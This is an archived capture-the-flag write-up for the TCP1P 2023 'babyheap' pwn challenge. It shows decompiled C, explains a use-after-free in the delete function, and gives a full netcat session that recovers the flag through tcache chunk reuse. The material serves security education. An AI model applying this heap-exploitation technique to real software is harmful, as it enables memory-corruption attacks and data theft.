# babyheap

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

babyheap

Description Author: HyggeHalcyon let’s see how well you understand the heap nc ctf.tcp1p.com 4267

Solution

We were given a binary called chall . Let’s disassemble it first.

main

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { setup ( argc , argv , envp ); while ( 1 ) { switch ( ( unsigned int ) menu () ) { case 1u : create (); break ; case 2u : delete (); break ; case 3u : view (); break ; case 4u : read_flag (); break ; case 5u : puts ( "[*] exiting..." ); exit ( 0 ); default : puts ( "[!] unknown choice" ); break ; } } }

There are four types of menus available. Let’s explore each of it first.

create

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 unsigned __int64 create () { int v1 ; // [rsp+8h] [rbp-48h] int n ; // [rsp+Ch] [rbp-44h] char s [ 40 ]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v4 ; // [rsp+38h] [rbp-18h] v4 = __readfsqword ( 0x28u ); printf ( "Index: " ); fgets ( s , 32 , stdin ); v1 = atoi ( s ); if ( v1 > 0 && v1 <= 10 ) { if ( * (( _QWORD * ) & user_chunk + v1 - 1 ) ) { puts ( "[!] oops, chunk already occupied" ); return v4 - __readfsqword ( 0x28u ); } printf ( "Size: " ); fgets ( s , 32 , stdin ); n = atoi ( s ); if ( n > 15 && n <= 256 ) { * (( _QWORD * ) & user_chunk + v1 - 1 ) = malloc ( n ); printf ( "Content: " ); fgets ( * (( char ** ) & user_chunk + v1 - 1 ), n , stdin ); puts ( "[*] creation success" ); return v4 - __readfsqword ( 0x28u ); } } puts ( "[!] sorry can't do that" ); return v4 - __readfsqword ( 0x28u ); }

In this menu, we can create a chunk , where the creation process will allocate memory using malloc based on the size we provide. Then, we can fill in the value in that chunk through fgets .

view

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 unsigned __int64 view () { int v1 ; // [rsp+Ch] [rbp-34h] char s [ 40 ]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3 ; // [rsp+38h] [rbp-8h] v3 = __readfsqword ( 0x28u ); printf ( "Index: " ); fgets ( s , 32 , stdin ); v1 = atoi ( s ); if ( v1 > 0 && v1 <= 10 ) { if ( * (( _QWORD * ) & user_chunk + v1 - 1 ) ) printf ( "[*] Data: %s

" , * (( const char ** ) & user_chunk + v1 - 1 )); else puts ( "[!] chunk is empty" ); } else { puts ( "[!] sorry can't do that" ); } return v3 - __readfsqword ( 0x28u ); }

With this menu, we can view the contents of the chunk we want based on the index we input.

delete

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 unsigned __int64 delete () { int v1 ; // [rsp+Ch] [rbp-34h] char s [ 40 ]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3 ; // [rsp+38h] [rbp-8h] v3 = __readfsqword ( 0x28u ); printf ( "Index: " ); fgets ( s , 32 , stdin ); v1 = atoi ( s ); if ( v1 > 0 && v1 <= 10 ) { free ( * (( void ** ) & user_chunk + v1 - 1 )); puts ( "[*] deletion success" ); } else { puts ( "[!] sorry can't do that" ); } return v3 - __readfsqword ( 0x28u ); }

This menu is used to delete a chunk we’ve created. There’s a bug in this menu, where after performing free , the stored pointer from the malloc retained in the user_chunk array isn’t cleared. Consequently, even though we’ve deleted that chunk , we can still view its contents later.

read_flag

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int read_flag () { int i ; // [rsp+4h] [rbp-Ch] FILE * stream ; // [rsp+8h] [rbp-8h] stream = fopen ( "flag.txt" , "r" ); if ( stream ) { for ( i = 0 ; i <= 3 ; ++ i ) flag_chunk = ( char * ) malloc ( 0x70uLL ); flag_chunk = ( char * ) malloc ( 0x70uLL ); fgets ( flag_chunk , 112 , stream ); fclose ( stream ); return puts ( "[*] flag loaded into memory" ); } else { puts ( "[!] flag.txt not found" ); return puts ( "[!] if this happened on the remote server, please contact admin." ); } }

This menu will call malloc(0x70) five times and then fill the last malloc chunk with the flag.

Based on the information obtained earlier, we see that the bug in the delete menu can be exploited to view the flag’s contents.

Note that when a chunk is removed through free , that chunk enters a cache managed by glibc , so the freed chunk can be reused when the program requests malloc again.

Given the previously discovered bug in the delete menu, we can exploit it by:

Creating chunk five times with a size of 0x70 (the same size as the flag ).

five times with a size of (the same size as the ). Deleting them all. There will be five chunks in the cache .

Calling read_flag . read_flag will reuse the chunks we’ve previously deleted.

. Using the view feature to see the contents of these chunks. One of the chunks will contain the flag.

Here is the demonstration:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 nc ctf . tcp1p . com 4267 Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 1 Index : 1 Size : 112 Content : a [ * ] creation success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 1 Index : 2 Size : 112 Content : a [ * ] creation success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 1 Index : 3 Size : 112 Content : a [ * ] creation success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 1 Index : 4 Size : 112 Content : a [ * ] creation success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 1 Index : 5 Size : 112 Content : a [ * ] creation success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 2 Index : 1 [ * ] deletion success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 2 Index : 2 [ * ] deletion success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 2 Index : 3 [ * ] deletion success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 2 Index : 4 [ * ] deletion success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 2 Index : 5 [ * ] deletion success Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 4 [ * ] flag loaded into memory Menu : ( 1 ) create [ 1 - 10 ] ( 2 ) delete [ 1 - 10 ] ( 3 ) view [ 1 - 10 ] ( 4 ) flag ( 5 ) exit > 3 Index : 1 [ * ] Data : TCP1P { k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle ??? }

Flag: TCP1P{k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle???}
